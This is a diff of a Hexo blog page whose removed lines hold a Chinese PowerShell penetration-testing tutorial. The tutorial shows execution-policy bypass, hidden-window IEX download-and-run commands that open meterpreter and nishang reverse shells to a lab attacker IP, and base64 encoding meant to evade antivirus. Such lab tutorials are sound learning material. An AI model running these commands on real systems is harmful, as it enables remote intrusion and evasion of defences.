@@ -2,9 +2,11 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 5.2.0">
+
+
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
@@ -13,19 +15,17 @@
 <link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
 
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"sunian19.github.io","root":"/","scheme":"Gemini","version":"7.7.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-  <meta name="description" content="powershell特点1、win7以上默认安装2、脚本可在内存中运行，不需要写入磁盘3、几乎不会触发杀软4、可远程执行">
+<script class="next-config" data-name="main" type="application/json">{"hostname":"sunian19.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="powershell特点 1、win7以上默认安装 2、脚本可在内存中运行，不需要写入磁盘 3、几乎不会触发杀软 4、可远程执行">
 <meta property="og:type" content="article">
 <meta property="og:title" content="&#39;powershell基础&#39;">
 <meta property="og:url" content="https://sunian19.github.io/2020/07/05/powershell%E5%9F%BA%E7%A1%80/index.html">
-<meta property="og:site_name" content="Sunian&#39;s Blog">
-<meta property="og:description" content="powershell特点1、win7以上默认安装2、脚本可在内存中运行，不需要写入磁盘3、几乎不会触发杀软4、可远程执行">
+<meta property="og:site_name" content="zer0_c|imb&#39;s blog">
+<meta property="og:description" content="powershell特点 1、win7以上默认安装 2、脚本可在内存中运行，不需要写入磁盘 3、几乎不会触发杀软 4、可远程执行">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://sunian19.github.io/imgss/a19.png">
 <meta property="og:image" content="https://sunian19.github.io/imgss/a18.png">
@@ -34,90 +34,55 @@
 <meta property="og:image" content="https://sunian19.github.io/imgss/a29.png">
 <meta property="og:image" content="https://sunian19.github.io/imgss/a30.png">
 <meta property="article:published_time" content="2020-07-04T16:00:00.000Z">
-<meta property="article:modified_time" content="2020-07-16T11:28:12.847Z">
-<meta property="article:author" content="素念">
+<meta property="article:modified_time" content="2020-07-16T11:28:14.000Z">
+<meta property="article:author" content="zer0_c|imb">
 <meta property="article:tag" content="渗透测试">
 <meta property="article:tag" content="基础知识">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://sunian19.github.io/imgss/a19.png">
 
+
 <link rel="canonical" href="https://sunian19.github.io/2020/07/05/powershell%E5%9F%BA%E7%A1%80/">
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true
-  };
-</script>
 
-  <title>'powershell基础' | Sunian's Blog</title>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://sunian19.github.io/2020/07/05/powershell%E5%9F%BA%E7%A1%80/","path":"2020/07/05/powershell基础/","title":"'powershell基础'"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>'powershell基础' | zer0_c|imb's blog</title>
   
 
-
-  <script>
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?d70c2fd321d2281d853a9197812a8f28";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
-
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?48584c486973b4bf025a425c3d7b4007"></script>
 
 
 
   <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-    <a target="_blank" rel="noopener" href="https://github.com/sunian19" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#70B7FD; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
     <header class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
     </div>
   </div>
 
   <div class="site-meta">
 
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Sunian's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">zer0_c|imb's blog</h1>
+      <i class="logo-line"></i>
+    </a>
   </div>
 
   <div class="site-nav-right">
@@ -128,240 +93,59 @@
 </div>
 
 
+
 <nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
-
-  </li>
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
       </li>
   </ul>
-
 </nav>
-  <div class="site-search">
-    <div class="popup search-popup">
-    <div class="search-header">
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
   <span class="search-icon">
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
            placeholder="搜索..." spellcheck="false"
            type="search" class="search-input">
   </div>
-  <span class="popup-btn-close">
+  <span class="popup-btn-close" role="button">
     <i class="fa fa-times-circle"></i>
   </span>
 </div>
-<div id="search-result"></div>
-
-</div>
-<div class="search-pop-overlay"></div>
-
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
   </div>
 </div>
-    </header>
 
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
+    </div>
   </div>
 
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content">
-            
-
-  <div class="posts-expand">
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://sunian19.github.io/2020/07/05/powershell%E5%9F%BA%E7%A1%80/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/imgss/touxiang.jpg">
-      <meta itemprop="name" content="素念">
-      <meta itemprop="description" content="忘川河畔彼岸花，红如鲜血似朱砂">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sunian's Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          'powershell基础'
-        </h1>
-
-        <div class="post-meta">
+</div>
         
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-07-05 00:00:00" itemprop="dateCreated datePublished" datetime="2020-07-05T00:00:00+08:00">2020-07-05</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-16 19:28:12" itemprop="dateModified" datetime="2020-07-16T19:28:12+08:00">2020-07-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-        <h3 id="powershell特点"><a href="#powershell特点" class="headerlink" title="powershell特点"></a>powershell特点</h3><p>1、win7以上默认安装<br>2、脚本可在内存中运行，不需要写入磁盘<br>3、几乎不会触发杀软<br>4、可远程执行</p>
-<a id="more"></a>
-<p>5、很多工具都是基于powershell开发<br>6、cmd.exe的运行通常会被阻止，但是powershell的运行不会<br>7、可用于管理活动目录(AD)<br>输入”Get-Host”或”$PSVersionTable.PSVERSION”查看powershell版本<br><img src="/imgss/a19.png"><br>操作系统对应的powershell版本表<br><img src="/imgss/a18.png"></p>
-<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>1、 .ps1文件<br>powershell脚本扩展名为”.ps1”<br>2、 执行策略<br>为防止使用者执行恶意脚本，powershell提供了执行策略，可使用如下命令进行查询<br>Get-ExecutionPolicy<br>Restricted：脚本不能运行(默认为此选项)<br>RemoteSigned：在本地创建的脚本可以运行，但从网上下载的脚本不能运行(有数字证书签名的除外)<br>ALLSigned：仅当前脚本由受信任的发布者签名时才能运行<br>Unrestricted：允许所有脚本运行<br>通过set-ExecutionPolicy+策略选项进行设置其他策略(需管理员权限)<br><img src="/imgss/a20.png"><br>3、管道<br>各个管道符的含义<br><img src="/imgss/a28.png"><br>PS：linux没有单个and符(&amp;)，&amp;符在linux中表示在后台运行，所以linux中用;分号，其它三个符号都相同<br>举例：get-process p* | stop-process<br>表示让所有正在运行、并且名字为p开头的程序，停止运行</p>
-<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>新建目录：New-Item susu -type Directory<br>新建文件：New-Item test.txt -type File<br>删除目录：Remove-Item 文件或目录<br>显示文本内容：Get-Content test.txt<br>设置文本内容：Set-Content test.txt -Value “Hello,word!”<br>追加内容：Add-Content 1.txt -Value “fuck you”<br>清楚内容：Clear-Content test.txt<br><img src="/imgss/a29.png"></p>
-<p>1、绕过本地文件权限并执行<br>将powerup.ps1上传到目标机，在命令行环境下，执行如下命令，绕过安全策略<br>powershell.exe -ExecutionPlicy Bypass -File powerup.ps1<br>或powershell.exe -exec bypass -Command “&amp; {import-module C:\powerup.ps1; invoke-AllChecks}”</p>
-<p>2、从公网下载脚本，绕过本地权限并隐藏执行</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -Exec Bypass -W Hidden -NoP -NonI &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;cheetz&#x2F;PowerSploit&#x2F;master&#x2F;CodeExecution&#x2F;Invoke--Shellcode.ps1&#39;)&quot;;Invoke-Shellcode -Payload windows&#x2F;meterpreter&#x2F;reverse_https -Lhost 192.168.37.132 -Lport 4399</span><br></pre></td></tr></table></figure></div>
-
-<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1">https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1</a><br>或<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a><br>参数说明：<br>-ExecutionPolicy Bypass(-Exec Bypass)：绕过安全策略，很多情况安全策略规定powershell不能运行命令和文件<br>-windowStyle Hidden(-W Hidden)：隐藏窗口<br>NonInteractive(-NonI)：非交互式模式，powershell不为用户提供交互式的提示<br>NoProfile(-NoP)：powershell控制台不加载当前用户的配置文件<br>-noexit：执行后不退出shell。在使用键盘记录等脚本时非常重要<br>-nologo：启动时不显示版权标志的powershell</p>
-<p>PS：图中我是先将公网上的ps1脚本下载下来，然后部署到kali上实验的，而且我未开启-W Hidden隐藏窗口！<br>(感觉Invoke–Shellcode.ps1脚本有问题，没有成功反弹shell，成功的大佬联系我，呜呜呜，现在建议用nisahng的Invoke-PowerShellTcp.ps1，测试-W Hidden之后是正常反弹shell的)</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反弹shell语句写在脚本最后一行</span><br><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress 192.168.37.132 -Port 4399</span><br><span class="line">目标机执行命令如下</span><br><span class="line">PowerShell.exe -Exec Bypass -W Hidden -NoP -NonI &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.37.132:8080&#x2F;Invoke-PowerShellTcp.ps1&#39;)&quot;;.\Invoke-PowerShellTcp.ps1</span><br></pre></td></tr></table></figure></div>
-<p><img src="/imgss/a30.png"></p>
-<p>3、使用base64对powershell命令编码(经测试会被win10自带杀软干掉)</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.37.132:8080&#x2F;Invoke--Shellcode.ps1&#39;);Invoke-Shellcode -Payload windows&#x2F;meterpreter&#x2F;reverse_https -Lhost 192.168.37.132 -Lport 4399 -Force&quot; &gt;raw.txt</span><br></pre></td></tr></table></figure></div>
-<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py">https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py</a><br>chmod a+x ps_encoder.py<br>./ps_encoder.py -s raw.txt<br>之后目标机执行如下命令即可</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powershell.exe -Nop -NonI -W Hidden -Exec Bypass -enc &quot;base64代码&quot;</span><br></pre></td></tr></table></figure></div>
-
-<p>4、运行32位和64位powershell<br>在64位操作系统中，有x64和x86两个版本powershell，他们互不影响，可以当成独立得两个程序</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">运行32位脚本命令：</span><br><span class="line">powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br><span class="line">运行64位脚本命令：</span><br><span class="line">%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure></div>
-    </div>
-
-    
-    
-    
-
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
-              <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="tag"># 基础知识</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2020/07/04/WIFI%E5%AE%89%E5%85%A8/" rel="prev" title="">
-      <i class="fa fa-chevron-left"></i> 
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/07/14/%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9%E6%8F%90%E6%9D%83%E4%B8%8EUAC%E7%BB%95%E8%BF%87/" rel="next" title="'组策略首选项提权与UAC绕过'">
-      '组策略首选项提权与UAC绕过' <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
   
-  
-  
-
-  </div>
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let activeClass = CONFIG.comments.activeClass;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
   </div>
 
   <aside class="sidebar">
-    <div class="sidebar-inner">
 
-      <ul class="sidebar-nav motion-element">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
         </li>
@@ -370,61 +154,55 @@
         </li>
       </ul>
 
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#powershell%E7%89%B9%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">powershell特点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-number">2.</span> <span class="nav-text">基本概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">3.</span> <span class="nav-text">常用命令</span></a></li></ol></div>
-      </div>
-      <!--/noindex-->
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#powershell-te-dian"><span class="nav-number">1.</span> <span class="nav-text">powershell特点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ji-ben-gai-nian"><span class="nav-number">2.</span> <span class="nav-text">基本概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chang-yong-ming-ling"><span class="nav-number">3.</span> <span class="nav-text">常用命令</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
 
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="素念"
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zer0_c|imb"
       src="/imgss/touxiang.jpg">
-  <p class="site-author-name" itemprop="name">素念</p>
+  <p class="site-author-name" itemprop="name">zer0_c|imb</p>
   <div class="site-description" itemprop="description">忘川河畔彼岸花，红如鲜血似朱砂</div>
 </div>
-<div class="site-state-wrap motion-element">
+<div class="site-state-wrap site-overview-item animated">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">78</span>
+        <a href="/archives/">
+          <span class="site-state-item-count">81</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">12</span>
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
-        <span class="site-state-item-count">33</span>
+          <a href="/tags/">
+        <span class="site-state-item-count">39</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
-  <div class="links-of-author motion-element">
+  <div class="links-of-author site-overview-item animated">
       <span class="links-of-author-item">
-        <a href="mailto:lingyu195@gmail.com" title="E-Mail → mailto:lingyu195@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+        <a href="mailto:lingyu195@gmail.com" title="E-Mail → mailto:lingyu195@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
       </span>
       <span class="links-of-author-item">
-        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=3504078815" title="QQ → tencent:&#x2F;&#x2F;AddContact&#x2F;?fromId&#x3D;45&amp;fromSubId&#x3D;1&amp;subcmd&#x3D;all&amp;uin&#x3D;3504078815" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a>
+        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=3504078815" title="QQ → tencent:&#x2F;&#x2F;AddContact&#x2F;?fromId&#x3D;45&amp;fromSubId&#x3D;1&amp;subcmd&#x3D;all&amp;uin&#x3D;3504078815" rel="noopener" target="_blank"><i class="qq fa-fw"></i>QQ</a>
       </span>
   </div>
 
 
-  <div class="links-of-blogroll motion-element">
-    <div class="links-of-blogroll-title">
-      <i class="fa fa-fw fa-link"></i>
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
       友情链接
     </div>
     <ul class="links-of-blogroll-list">
-        <li class="links-of-blogroll-item">
-          <a href="http://wp.fmk.pub/" title="http:&#x2F;&#x2F;wp.fmk.pub&#x2F;" rel="noopener" target="_blank">Defender</a>
-        </li>
         <li class="links-of-blogroll-item">
           <a href="http://www.ch4ser.top/" title="http:&#x2F;&#x2F;www.ch4ser.top&#x2F;" rel="noopener" target="_blank">ch4ser</a>
         </li>
@@ -440,42 +218,221 @@
     </ul>
   </div>
 
+        </div>
       </div>
-
     </div>
   </aside>
-  <div id="sidebar-dimmer"></div>
+  <div class="sidebar-dimmer"></div>
 
 
-      </div>
-    </main>
+    </header>
 
-    <footer class="footer">
-      <div class="footer-inner">
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sunian19.github.io/2020/07/05/powershell%E5%9F%BA%E7%A1%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/imgss/touxiang.jpg">
+      <meta itemprop="name" content="zer0_c|imb">
+      <meta itemprop="description" content="忘川河畔彼岸花，红如鲜血似朱砂">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zer0_c|imb's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          'powershell基础'
+        </h1>
+
+
+        <div class="post-meta">
         
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
